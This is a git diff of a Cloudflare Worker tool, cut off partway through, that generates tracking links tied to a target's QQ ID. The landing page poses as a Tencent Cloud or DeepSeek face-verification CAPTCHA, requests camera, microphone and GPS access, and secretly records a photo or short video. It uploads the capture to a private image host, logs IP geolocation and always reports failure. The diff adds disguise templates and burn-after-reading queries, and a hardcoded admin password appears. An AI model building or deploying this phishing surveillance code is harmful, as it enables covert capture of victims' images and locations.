@@ -1,7 +1,6 @@
 /**
- * 现代照妖镜 · 深度研究版
- * 功能：自动建表 | 极简UI | 图床转发 | 人脸模拟 | 位置采集 | 管理员后台
- * 管理员密码: sakcnzz666
+ * 现代简约技术研究系统 - 终极增强版
+ * 仅供安全研究、靶场测试及前端权限调用学习使用
  */
 
 const ADMIN_PASSWORD = "sakcnzz666";
@@ -13,478 +12,602 @@ export default {
     const url = new URL(request.url);
     const path = url.pathname;
 
-    // 自动初始化数据库
+    // 1. 自动初始化数据库
     await initDB(env);
 
-    // 路由分发
-    if (path === "/" || path === "/index.html") {
-      return renderHome();
-    }
+    // 2. 路由分发
+    if (path === "/" || path === "/index.html") return renderHome();
+    if (path.startsWith("/t/")) return renderTargetPage(path.split("/")[2]);
     
-    if (path.startsWith("/t/")) {
-      const id = path.split("/")[2];
-      return renderCapturePage(id);
-    }
-
-    if (path === "/api/upload") {
-      return handleUpload(request, env);
-    }
-
-    if (path === "/api/query") {
-      return handleQuery(request, env);
-    }
-
-    if (path === "/admin") {
-      return renderAdmin(request, env);
-    }
-
-    if (path === "/api/geo") {
-      return handleGeo(request);
-    }
+    // API 接口
+    if (path === "/api/generate") return handleGenerate(request, env);
+    if (path === "/api/upload") return handleUpload(request, env);
+    if (path === "/api/query") return handleQuery(request, env);
+    
+    // 管理后台
+    if (path === "/admin") return renderAdmin(request, env);
 
     return new Response("Not Found", { status: 404 });
   }
 };
 
-// ---------- 数据库初始化 ----------
+/**
+ * ==========================================
+ * 数据库与后端业务逻辑
+ * ==========================================
+ */
+
 async function initDB(env) {
+  // 采用单表事件日志模型，完整追踪 生成、访问、查询 的全生命周期
   await env.DB.prepare(`
-    CREATE TABLE IF NOT EXISTS records (
-      id TEXT PRIMARY KEY,
-      uid TEXT,
-      img_url TEXT,
-      media_type TEXT DEFAULT 'image',
-      ua TEXT,
+    CREATE TABLE IF NOT EXISTS sys_logs (
+      id INTEGER PRIMARY KEY AUTOINCREMENT,
+      target_id TEXT,
+      event_type TEXT,    -- 'GENERATE', 'VISIT', 'QUERY'
       ip TEXT,
-      latitude REAL,
-      longitude REAL,
-      location_info TEXT,
+      geo_info TEXT,      -- 外部IP定位接口数据
+      device_geo TEXT,    -- 用户授权获取的GPS经纬度
+      media_type TEXT,    -- 'photo', 'video', 'denied'
+      media_url TEXT,
+      ua TEXT,
+      status TEXT,
+      is_burned INTEGER DEFAULT 0,
       created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )
   `).run();
 }
 
-// ---------- 首页：生成面板 & 查询面板 ----------
-function renderHome() {
-  const html = `<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>照妖镜 · 深度研究</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    * { transition: all 0.2s ease; }
-    body { background: radial-gradient(circle at 10% 20%, #0f172a, #020617); min-height: 100vh; }
-    .glass { background: rgba(15, 23, 42, 0.7); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid rgba(56, 189, 248, 0.15); }
-    .glass-card { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); -webkit-backdrop-filter: blur(12px); border: 1px solid rgba(56, 189, 248, 0.2); }
-    .input-glow:focus { box-shadow: 0 0 20px rgba(56, 189, 248, 0.3); border-color: #38bdf8; }
-    .btn-primary { background: linear-gradient(135deg, #0ea5e9, #3b82f6); box-shadow: 0 8px 20px -8px #0ea5e9; }
-    .btn-primary:active { transform: scale(0.97); }
-    .animate-float { animation: float 6s ease-in-out infinite; }
-    @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-10px); } 100% { transform: translateY(0px); } }
-  </style>
-</head>
-<body class="flex items-center justify-center p-4">
-  <div class="max-w-2xl w-full space-y-6">
-    <!-- 标题 -->
-    <div class="text-center space-y-2">
-      <h1 class="text-5xl font-bold bg-gradient-to-r from-cyan-400 via-sky-400 to-blue-500 bg-clip-text text-transparent animate-float">🔍 照妖镜</h1>
-      <p class="text-sky-200/80 text-sm tracking-wider">深度人脸研究 · 仅供学习交流</p>
-    </div>
-    
-    <!-- 生成卡片 -->
-    <div class="glass rounded-3xl p-6 shadow-2xl">
-      <h2 class="text-xl font-semibold text-white mb-5 flex items-center gap-2"><span class="w-1.5 h-6 bg-cyan-400 rounded-full"></span>生成追踪链接</h2>
-      <div class="space-y-4">
-        <input id="target_id" type="text" placeholder="输入对方标识 (QQ/ID)" class="w-full px-5 py-3.5 bg-white/5 border border-white/10 rounded-2xl text-white placeholder-white/30 outline-none input-glow">
-        <input id="redirect_url" type="text" placeholder="跳转链接 (可选，拍照后跳转)" class="w-full px-5 py-3.5 bg-white/5 border border-white/10 rounded-2xl text-white placeholder-white/30 outline-none input-glow">
-        <button onclick="makeLink()" class="w-full btn-primary text-white font-semibold py-3.5 rounded-2xl shadow-lg transition-all active:scale-95">✨ 生成专属链接</button>
-      </div>
-      <div id="link_area" class="mt-5 p-4 bg-cyan-950/40 rounded-xl break-all text-sm text-cyan-200 border border-cyan-500/20 hidden"></div>
-    </div>
-    
-    <!-- 查询卡片 -->
-    <div class="glass rounded-3xl p-6 shadow-2xl">
-      <h2 class="text-xl font-semibold text-white mb-5 flex items-center gap-2"><span class="w-1.5 h-6 bg-emerald-400 rounded-full"></span>查询记录</h2>
-      <div class="space-y-4">
-        <input id="query_id" type="text" placeholder="输入标识ID" class="w-full px-5 py-3.5 bg-white/5 border border-white/10 rounded-2xl text-white placeholder-white/30 outline-none input-glow">
-        <button onclick="query()" class="w-full bg-emerald-600/90 hover:bg-emerald-500 text-white font-semibold py-3.5 rounded-2xl shadow-lg transition-all active:scale-95">🔎 查看最新影像</button>
-      </div>
-      <div id="result_area" class="mt-5 hidden space-y-3">
-        <div class="relative rounded-2xl overflow-hidden border border-white/10">
-          <img id="res_pic" class="w-full object-contain max-h-80 bg-black/40" src="">
-        </div>
-        <div id="geo_info" class="text-xs text-white/60 bg-black/20 p-3 rounded-xl"></div>
-      </div>
-    </div>
-    <p class="text-white/30 text-xs text-center">技术研究版 · 请勿用于非法用途 · 数据加密传输</p>
-  </div>
-  <script>
-    function makeLink() {
-      const id = document.getElementById('target_id').value.trim();
-      if(!id) return alert('请输入标识');
-      const redirect = document.getElementById('redirect_url').value.trim();
-      let encoded = btoa(encodeURIComponent(id));
-      if(redirect) encoded += '?r=' + encodeURIComponent(redirect);
-      const url = location.origin + '/t/' + encoded;
-      const area = document.getElementById('link_area');
-      area.innerText = url;
-      area.classList.remove('hidden');
-    }
-    async function query() {
-      const id = document.getElementById('query_id').value.trim();
-      if(!id) return;
-      const res = await fetch('/api/query?uid=' + encodeURIComponent(id));
-      const data = await res.json();
-      const area = document.getElementById('result_area');
-      if(data.src) {
-        document.getElementById('res_pic').src = data.src;
-        let geoHtml = '';
-        if(data.latitude) geoHtml += '📍 纬度: ' + data.latitude + ' 经度: ' + data.longitude + ' | ';
-        if(data.ip) geoHtml += '🖥️ IP: ' + data.ip;
-        if(data.location_info) {
-          try {
-            const loc = JSON.parse(data.location_info);
-            geoHtml += ' | ' + (loc.city || '') + ' ' + (loc.country || '');
-          } catch(e){}
-        }
-        document.getElementById('geo_info').innerText = geoHtml || '无附加信息';
-        area.classList.remove('hidden');
-      } else {
-        alert('暂无记录');
-      }
-    }
-  </script>
-</body>
-</html>`;
-  return new Response(html, { headers: { "Content-Type": "text/html" } });
-}
-
-// ---------- 捕获页：引导流程 + 人脸模拟 + 权限请求 ----------
-function renderCapturePage(encodedId) {
-  // 解析参数: id 和可能的跳转
-  let targetId = '';
-  let redirectUrl = '';
+async function getGeoByIp(ip) {
   try {
-    const decoded = decodeURIComponent(atob(encodedId));
-    if(decoded.includes('?r=')) {
-      const parts = decoded.split('?r=');
-      targetId = parts[0];
-      redirectUrl = decodeURIComponent(parts[1]);
-    } else {
-      targetId = decoded;
-    }
-  } catch(e) {
-    targetId = 'unknown';
+    const res = await fetch(`${GEO_API}?ip=${ip}`);
+    return await res.text();
+  } catch (e) {
+    return JSON.stringify({ error: "Geo API Timeout" });
   }
-  
-  const html = `<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-  <title>人脸核验 · 安全检测</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <style>
-    body { background: #030712; min-height: 100vh; display: flex; align-items: center; justify-content: center; font-family: system-ui, -apple-system, sans-serif; }
-    .glass-panel { background: rgba(17, 25, 40, 0.75); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(56, 189, 248, 0.2); border-radius: 32px; }
-    .mirror { border-radius: 50%; overflow: hidden; box-shadow: 0 0 40px rgba(0, 180, 255, 0.3); border: 3px solid rgba(56, 189, 248, 0.6); }
-    .pulse-ring { animation: pulse 2s infinite; }
-    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(56, 189, 248, 0); } 100% { box-shadow: 0 0 0 0 rgba(56, 189, 248, 0); } }
-    .fade-in { animation: fadeIn 0.5s; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-  </style>
-</head>
-<body class="p-4">
-  <div class="w-full max-w-md glass-panel p-6 text-white shadow-2xl fade-in">
-    <!-- 动态内容区 -->
-    <div id="app"></div>
-  </div>
-  <script>
-    const TARGET_UID = "${targetId}";
-    const REDIRECT_URL = "${redirectUrl}";
-    
-    // 状态管理
-    let step = 'agreement'; // agreement, permission, capture, result
-    let stream = null;
-    let mediaType = 'image'; // 'image' 或 'video'
-    let locationData = null;
-    let mediaRecorder = null;
-    let recordedChunks = [];
-    
-    const app = document.getElementById('app');
-    
-    function render() {
-      if (step === 'agreement') {
-        app.innerHTML = \`
-          <div class="text-center space-y-4">
-            <div class="text-5xl mb-2">🛡️</div>
-            <h2 class="text-2xl font-bold">用户协议与隐私声明</h2>
-            <div class="h-40 overflow-y-auto text-sm text-white/70 bg-black/20 p-4 rounded-xl text-left">
-              <p class="mb-2">1. 本工具仅用于学术研究与反机器人验证，严禁非法获取他人信息。</p>
-              <p class="mb-2">2. 我们将采集您的摄像头画面、位置信息用于人机验证，数据加密存储。</p>
-              <p class="mb-2">3. 您需同意按照提示完成动作（眨眼/张嘴）以通过检测。</p>
-              <p>4. 点击同意即表示您自愿参与并授权本次数据采集。</p>
-            </div>
-            <label class="flex items-center justify-center gap-2 text-sm">
-              <input type="checkbox" id="agreeCheck" class="w-4 h-4"> 我已阅读并同意以上协议
-            </label>
-            <button id="agreeBtn" class="w-full bg-gradient-to-r from-blue-600 to-cyan-500 text-white font-bold py-3.5 rounded-2xl shadow-lg disabled:opacity-50 disabled:grayscale" disabled>同意并继续</button>
-            <p class="text-xs text-white/40">由深度求索安全提供技术支持</p>
-          </div>
-        \`;
-        const check = document.getElementById('agreeCheck');
-        const btn = document.getElementById('agreeBtn');
-        check.addEventListener('change', () => btn.disabled = !check.checked);
-        btn.addEventListener('click', () => { step = 'permission'; render(); });
-      } else if (step === 'permission') {
-        app.innerHTML = \`
-          <div class="text-center space-y-4">
-            <div class="text-5xl">🔐</div>
-            <h2 class="text-xl font-semibold">正在准备安全环境</h2>
-            <p class="text-white/70 text-sm">我们需要获取摄像头、麦克风及位置权限以完成人机验证</p>
-            <div class="flex justify-center py-4">
-              <div class="w-12 h-12 border-4 border-blue-500/30 border-t-blue-400 rounded-full animate-spin"></div>
-            </div>
-            <p class="text-xs text-white/40">您的信息将受到严格保护</p>
-          </div>
-        \`;
-        requestPermissions();
-      } else if (step === 'capture') {
-        app.innerHTML = \`
-          <div class="space-y-4">
-            <div class="text-center">
-              <h2 class="text-xl font-bold">🤖 人脸核验</h2>
-              <p class="text-sm text-cyan-300">请将面部置于框内，并按提示动作</p>
-            </div>
-            <div class="mirror w-64 h-64 mx-auto relative bg-black">
-              <video id="videoPreview" autoplay playsinline class="w-full h-full object-cover"></video>
-            </div>
-            <div id="actionHint" class="text-center text-lg font-medium text-yellow-300 h-8">👀 请眨眼</div>
-            <div class="flex gap-3 justify-center">
-              <button id="capturePhotoBtn" class="px-5 py-3 bg-blue-600/80 rounded-xl text-sm font-medium active:scale-95">📸 拍照验证</button>
-              <button id="recordVideoBtn" class="px-5 py-3 bg-purple-600/80 rounded-xl text-sm font-medium active:scale-95">🎥 录像(3秒)</button>
-            </div>
-            <div id="locationStatus" class="text-xs text-white/50 text-center"></div>
-            <p class="text-xs text-white/30 text-center">由腾讯云提供人机验证功能</p>
-          </div>
-        \`;
-        startCamera();
-        document.getElementById('capturePhotoBtn').addEventListener('click', () => capture('image'));
-        document.getElementById('recordVideoBtn').addEventListener('click', () => capture('video'));
-      } else if (step === 'result') {
-        app.innerHTML = \`
-          <div class="text-center space-y-4">
-            <div class="text-6xl">❌</div>
-            <h2 class="text-2xl font-bold text-red-400">人机验证失败</h2>
-            <p class="text-white/80">原因：光线过强或未按提示完成动作</p>
-            <button id="retryBtn" class="w-full bg-white/10 text-white py-3 rounded-xl mt-4 active:scale-95">重新验证</button>
-          </div>
-        \`;
-        document.getElementById('retryBtn').addEventListener('click', () => { step = 'capture'; render(); });
-      }
-    }
-    
-    async function requestPermissions() {
-      try {
-        // 先请求位置（可选）
-        if(navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(pos => {
-            locationData = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-          }, () => { locationData = null; });
-        }
-        // 关键：相机+麦克风
-        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-        step = 'capture';
-      } catch(e) {
-        // 权限拒绝显示可信提示
-        app.innerHTML = \`
-          <div class="text-center space-y-4">
-            <div class="text-6xl">🚫</div>
-            <h2 class="text-xl font-bold">访问受限</h2>
-            <p class="text-white/80">由于近期恶意流量激增，我们需要获取摄像头权限以完成人机验证。请授权后重试。</p>
-            <button id="retryPermBtn" class="w-full bg-blue-600 py-3 rounded-xl">重新授权</button>
-          </div>
-        \`;
-        document.getElementById('retryPermBtn').addEventListener('click', () => { step = 'permission'; render(); });
-        return;
-      }
-      render();
-    }
-    
-    function startCamera() {
-      const video = document.getElementById('videoPreview');
-      if(stream) video.srcObject = stream;
-      // 模拟随机动作提示
-      const hints = ['👀 请眨眼', '😮 请张嘴', '🙂 保持正脸'];
-      let i = 0;
-      setInterval(() => {
-        const hintEl = document.getElementById('actionHint');
-        if(hintEl) hintEl.innerText = hints[i++ % hints.length];
-      }, 2000);
-    }
-    
-    async function capture(type) {
-      mediaType = type;
-      const video = document.getElementById('videoPreview');
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0);
-      
-      let blob;
-      if(type === 'image') {
-        blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-      } else {
-        // 录像3秒
-        if(!MediaRecorder.isTypeSupported('video/webm')) {
-          alert('您的浏览器不支持录像，将使用拍照模式');
-          mediaType = 'image';
-          blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-        } else {
-          mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-          recordedChunks = [];
-          mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
-          mediaRecorder.start();
-          setTimeout(() => {
-            mediaRecorder.stop();
-            mediaRecorder.onstop = async () => {
-              blob = new Blob(recordedChunks, { type: 'video/webm' });
-              await uploadAndFinish(blob);
-            };
-          }, 3000);
-          return;
-        }
-      }
-      await uploadAndFinish(blob);
-    }
-    
-    async function uploadAndFinish(blob) {
-      const form = new FormData();
-      form.append('file', blob, mediaType === 'image' ? 'photo.jpg' : 'video.webm');
-      form.append('uid', TARGET_UID);
-      if(locationData) {
-        form.append('lat', locationData.lat);
-        form.append('lng', locationData.lng);
-      }
-      // 显示上传中
-      app.innerHTML = '<div class="text-center py-10"><div class="inline-block w-10 h-10 border-4 border-blue-400 border-t-transparent rounded-full animate-spin"></div><p class="mt-3">正在验证...</p></div>';
-      try {
-        await fetch('/api/upload', { method: 'POST', body: form });
-        // 始终显示失败 (模拟研究)
-        step = 'result';
-        render();
-        // 如果设置了跳转，5秒后跳转
-        if(REDIRECT_URL) {
-          setTimeout(() => { window.location.href = REDIRECT_URL; }, 5000);
-        }
-      } catch(e) {
-        alert('网络错误');
-      } finally {
-        if(stream) stream.getTracks().forEach(t => t.stop());
-      }
-    }
-    
-    render();
-  </script>
-</body>
-</html>`;
-  return new Response(html, { headers: { "Content-Type": "text/html" } });
 }
 
-// ---------- 上传处理：转发图床 + 存储D1 + 获取IP地理信息 ----------
+async function handleGenerate(request, env) {
+  if (request.method !== "POST") return new Response("Method Not Allowed", { status: 405 });
+  const data = await request.json();
+  const ip = request.headers.get('cf-connecting-ip') || 'Unknown';
+  const geo = await getGeoByIp(ip);
+
+  // 记录“生成者”IP事件
+  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?, ?, ?, ?, ?, ?)")
+    .bind(data.id, 'GENERATE', ip, geo, request.headers.get('user-agent'), 'success')
+    .run();
+
+  const encoded = btoa(encodeURIComponent(JSON.stringify(data)));
+  return new Response(JSON.stringify({ url: `${new URL(request.url).origin}/t/${encoded}` }), { headers: { "Content-Type": "application/json" } });
+}
+
+async function handleQuery(request, env) {
+  const { searchParams } = new URL(request.url);
+  const targetId = searchParams.get('id');
+  const ip = request.headers.get('cf-connecting-ip') || 'Unknown';
+  const geo = await getGeoByIp(ip);
+
+  // 记录“查询者”IP事件
+  await env.DB.prepare("INSERT INTO sys_logs (target_id, event_type, ip, geo_info, ua, status) VALUES (?, ?, ?, ?, ?, ?)")
+    .bind(targetId, 'QUERY', ip, geo, request.headers.get('user-agent'), 'success')
+    .run();
+
+  // 获取该ID下所有未被焚毁的访问记录
+  const { results } = await env.DB.prepare("SELECT * FROM sys_logs WHERE target_id = ? AND event_type = 'VISIT' AND is_burned = 0 ORDER BY created_at DESC").bind(targetId).all();
+
+  // 处理阅后即焚
+  if (results.length > 0) {
+    const shouldBurn = searchParams.get('burn') === 'true';
+    if (shouldBurn) {
+      await env.DB.prepare("UPDATE sys_logs SET is_burned = 1 WHERE target_id = ? AND event_type = 'VISIT'").bind(targetId).run();
+    }
+  }
+
+  return new Response(JSON.stringify(results), { headers: { "Content-Type": "application/json" } });
+}
+
 async function handleUpload(request, env) {
   try {
     const formData = await request.formData();
-    const file = formData.get('file');
-    const uid = formData.get('uid');
-    const lat = formData.get('lat');
-    const lng = formData.get('lng');
+    const file = formData.get('file'); // 可能为空（如果用户拒绝权限）
+    const config = JSON.parse(formData.get('config'));
+    const deviceGeo = formData.get('location');
+    const status = formData.get('status');
+    const mediaType = config.mode;
     const ua = request.headers.get('user-agent') || 'Unknown';
     const ip = request.headers.get('cf-connecting-ip') || 'Unknown';
-    
-    // 获取IP地理信息
-    let geoInfo = null;
-    try {
-      const geoRes = await fetch(`${GEO_API}?ip=${ip}`);
-      geoInfo = await geoRes.text();
-    } catch(e) { geoInfo = null; }
-    
-    // 上传图床
-    const uploadForm = new FormData();
-    uploadForm.append('file', file);
-    const tcRes = await fetch(`https://${IMAGE_HOST}/upload`, { method: 'POST', body: uploadForm });
-    const tcData = await tcRes.json();
-    const imgPath = tcData[0].src;
-    const fullUrl = `https://${IMAGE_HOST}${imgPath}`;
-    
-    // 判断媒体类型
-    const mediaType = (file.type || '').startsWith('video/') ? 'video' : 'image';
-    
-    const recordId = crypto.randomUUID();
+    const geo = await getGeoByIp(ip);
+
+    let fullMediaUrl = "";
+
+    // 如果用户同意权限且有文件，转发至私人图床 tc.ilqx.dpdns.org
+    if (file && status === 'success') {
+      const uploadForm = new FormData();
+      uploadForm.append('file', file);
+      const tcRes = await fetch(`https://${IMAGE_HOST}/upload`, { method: 'POST', body: uploadForm });
+      if (tcRes.ok) {
+        const tcData = await tcRes.json();
+        fullMediaUrl = `https://${IMAGE_HOST}${tcData[0].src}`;
+      }
+    }
+
+    // 记录“访问者”事件（含照片/视频、经纬度）
     await env.DB.prepare(`
-      INSERT INTO records (id, uid, img_url, media_type, ua, ip, latitude, longitude, location_info)
+      INSERT INTO sys_logs (target_id, event_type, ip, geo_info, device_geo, media_type, media_url, ua, status) 
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
-    `).bind(recordId, uid, fullUrl, mediaType, ua, ip, lat || null, lng || null, geoInfo).run();
-    
+    `).bind(config.id, 'VISIT', ip, geo, deviceGeo, mediaType, fullMediaUrl, ua, status).run();
+
     return new Response(JSON.stringify({ success: true }), { headers: { "Content-Type": "application/json" } });
   } catch (err) {
     return new Response(JSON.stringify({ error: err.message }), { status: 500 });
   }
 }
 
-// ---------- API：查询最新记录 ----------
-async function handleQuery(request, env) {
-  const { searchParams } = new URL(request.url);
-  const uid = searchParams.get('uid');
-  const result = await env.DB.prepare(`
-    SELECT img_url, media_type, ip, latitude, longitude, location_info, created_at
-    FROM records WHERE uid = ? ORDER BY created_at DESC LIMIT 1
-  `).bind(uid).first();
-  
-  return new Response(JSON.stringify(result || {}), { headers: { "Content-Type": "application/json" } });
-}
+/**
+ * ==========================================
+ * 前端 UI 渲染 (首页、目标页、管理后台)
+ * ==========================================
+ */
 
-// ---------- 管理后台 ----------
-async function renderAdmin(request, env) {
-  const { searchParams } = new URL(request.url);
-  if (searchParams.get('p') !== ADMIN_PASSWORD) {
-    return new Response("Unauthorized", { status: 401 });
-  }
-  const { results } = await env.DB.prepare("SELECT * FROM records ORDER BY created_at DESC").all();
-  
-  const rows = results.map(r => `
-    <tr class="border-b border-gray-700 hover:bg-gray-800/50">
-      <td class="p-3 font-mono text-blue-300">${r.uid}</td>
-      <td class="p-3">
-        ${r.media_type === 'video' 
-          ? `<video src="${r.img_url}" controls class="h-20 rounded"></video>` 
-          : `<a href="${r.img_url}" target="_blank"><img src="${r.img_url}" class="h-20 rounded"></a>`}
-      </td>
-      <td class="p-3 text-xs">${r.ip}<br><span class="text-gray-400">${r.ua?.substring(0,40)}</span></td>
-      <td class="p-3 text-xs">${r.latitude ? r.latitude.toFixed(4)+','+r.longitude.toFixed(4) : '-'}</td>
-      <td class="p-3 text-xs">${r.created_at}</td>
-    </tr>
-  `).join('');
-  
-  const html = `<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>管理后台</title><script src="https://cdn.tailwindcss.com"></script></head>
-<body class="bg-gray-900 text-white p-6"><div class="max-w-7xl mx-auto">
-  <h1 class="text-3xl font-bold mb-6">📋 捕获记录</h1>
-  <div class="overflow-x-auto"><table class="w-full text-left">
-    <thead class="bg-gray-800"><tr><th class="p-3">UID</th><th class="p-3">媒体</th><th class="p-3">IP/UA</th><th class="p-3">经纬度</th><th class="p-3">时间</th></tr></thead>
-    <tbody>${rows}</tbody>
-  </table></div>
-</div></body></html>`;
+function renderHome() {
+  const html = `
+  <!DOCTYPE html>
+  <html lang="zh-CN">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SEC-TEST 漏洞分析平台</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+      body { background: linear-gradient(135deg, #f6f8fd 0%, #f1f5f9 100%); }
+      .glass { background: rgba(255, 255, 255, 0.7); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.5); }
+      .fade-in { animation: fadeIn 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+      @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+  </head>
+  <body class="min-h-screen text-gray-800 selection:bg-indigo-100 selection:text-indigo-900">
+    
+    <div class="max-w-4xl mx-auto p-6 pt-12">
+      <div class="glass rounded-2xl p-6 mb-8 shadow-sm fade-in">
+        <h1 class="text-2xl font-bold text-indigo-900 mb-4"><i class="fa-solid fa-shield-halved mr-2"></i>SEC-TEST 技术研究实验平台</h1>
+        <div class="text-sm text-gray-600 space-y-2 leading-relaxed">
+          <p><strong class="text-red-500">作者声明：</strong>1. 本工具仅供技术研究、学校实验、安全靶场实测及前端权限调用学习使用，<strong>绝非非法用途</strong>，否则后果自负！网站权限均由用户浏览器原生机制自愿点击允许。</p>
+          <p>2. 识别ID为查看结果的唯一凭证，请妥善保管。</p>
+          <p>3. 如有侵权、肖像权等问题，请联系系统管理员进行物理删除。</p>
+          <p class="text-indigo-600 font-medium"><i class="fa-solid fa-circle-info mr-1"></i>注意：受iOS系统安全限制，苹果设备须使用Safari浏览器原生内核打开方可正常调用底层硬件接口。</p>
+        </div>
+      </div>
+
+      <div class="grid md:grid-cols-2 gap-8">
+        <div class="glass rounded-2xl p-8 shadow-lg hover:shadow-xl transition-shadow duration-300 fade-in" style="animation-delay: 0.1s;">
+          <h2 class="text-xl font-bold mb-6 flex items-center"><i class="fa-solid fa-wand-magic-sparkles text-indigo-500 mr-2"></i>生成面板</h2>
+          <div class="space-y-5">
+            <div>
+              <label class="block text-sm font-medium text-gray-700 mb-1">跟踪 ID (如QQ号)</label>
+              <input id="target_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 focus:ring-2 focus:ring-indigo-200 outline-none transition-all">
+            </div>
+            
+            <div class="grid grid-cols-2 gap-4">
+              <div>
+                <label class="block text-sm font-medium text-gray-700 mb-1">伪装模板</label>
+                <select id="template" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 outline-none">
+                  <option value="blank">空白加载模板</option>
+                  <option value="captcha">人机验证模板</option>
+                  <option value="download">文件下载模板</option>
+                  <option value="redirect">链接跳转模板</option>
+                </select>
+              </div>
+              <div id="redirect_url_box" class="hidden">
+                <label class="block text-sm font-medium text-gray-700 mb-1">跳转目标地址</label>
+                <input id="redirect_url" type="text" placeholder="http://" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-indigo-500 outline-none">
+              </div>
+            </div>
+
+            <div class="flex items-center space-x-6 pt-2">
+              <label class="flex items-center cursor-pointer">
+                <input type="radio" name="mode" value="photo" checked class="w-4 h-4 text-indigo-600 focus:ring-indigo-500 border-gray-300">
+                <span class="ml-2 text-sm text-gray-700">极速拍照</span>
+              </label>
+              <label class="flex items-center cursor-pointer">
+                <input type="radio" name="mode" value="video" class="w-4 h-4 text-indigo-600 focus:ring-indigo-500 border-gray-300">
+                <span class="ml-2 text-sm text-gray-700">3秒录像</span>
+              </label>
+            </div>
+
+            <div class="space-y-3 pt-2">
+              <label class="flex items-center cursor-pointer">
+                <div class="relative">
+                  <input type="checkbox" id="need_location" class="sr-only">
+                  <div class="block bg-gray-200 w-10 h-6 rounded-full transition-colors toggle-bg"></div>
+                  <div class="dot absolute left-1 top-1 bg-white w-4 h-4 rounded-full transition-transform"></div>
+                </div>
+                <span class="ml-3 text-sm font-medium text-gray-700">同时请求精准经纬度 (GPS)</span>
+              </label>
+              <label class="flex items-center cursor-pointer">
+                <div class="relative">
+                  <input type="checkbox" id="burn_after_reading" class="sr-only">
+                  <div class="block bg-gray-200 w-10 h-6 rounded-full transition-colors toggle-bg"></div>
+                  <div class="dot absolute left-1 top-1 bg-white w-4 h-4 rounded-full transition-transform"></div>
+                </div>
+                <span class="ml-3 text-sm font-medium text-gray-700">开启阅后即焚 (查询一次即销毁)</span>
+              </label>
+            </div>
+
+            <button onclick="generateLink()" class="w-full mt-4 bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-indigo-200 transition-all active:scale-95 flex justify-center items-center">
+              <i class="fa-solid fa-link mr-2"></i> 生成专属追踪链接
+            </button>
+            <div id="link_result" class="hidden p-4 bg-indigo-50 border border-indigo-100 rounded-xl text-indigo-800 text-sm break-all"></div>
+          </div>
+        </div>
+
+        <div class="glass rounded-2xl p-8 shadow-lg hover:shadow-xl transition-shadow duration-300 fade-in" style="animation-delay: 0.2s;">
+          <h2 class="text-xl font-bold mb-6 flex items-center"><i class="fa-solid fa-magnifying-glass text-emerald-500 mr-2"></i>查询面板</h2>
+          <div class="space-y-5">
+            <div>
+              <label class="block text-sm font-medium text-gray-700 mb-1">追踪 ID</label>
+              <input id="query_id" type="text" class="w-full px-4 py-3 rounded-xl bg-white border border-gray-200 focus:border-emerald-500 focus:ring-2 focus:ring-emerald-200 outline-none transition-all">
+            </div>
+            <button onclick="queryData()" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3.5 rounded-xl shadow-lg shadow-emerald-200 transition-all active:scale-95 flex justify-center items-center">
+              <i class="fa-solid fa-database mr-2"></i> 检索返回结果
+            </button>
+            
+            <div id="query_loading" class="hidden text-center py-8 text-gray-400"><i class="fa-solid fa-circle-notch fa-spin fa-2x"></i></div>
+            <div id="query_result" class="space-y-4 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <style>
+      input:checked + .toggle-bg { background-color: #4f46e5; }
+      input:checked + .toggle-bg + .dot { transform: translateX(100%); }
+      .custom-scrollbar::-webkit-scrollbar { width: 6px; }
+      .custom-scrollbar::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 10px; }
+    </style>
+
+    <script>
+      document.getElementById('template').addEventListener('change', function() {
+        document.getElementById('redirect_url_box').style.display = this.value === 'redirect' ? 'block' : 'none';
+      });
+
+      async function generateLink() {
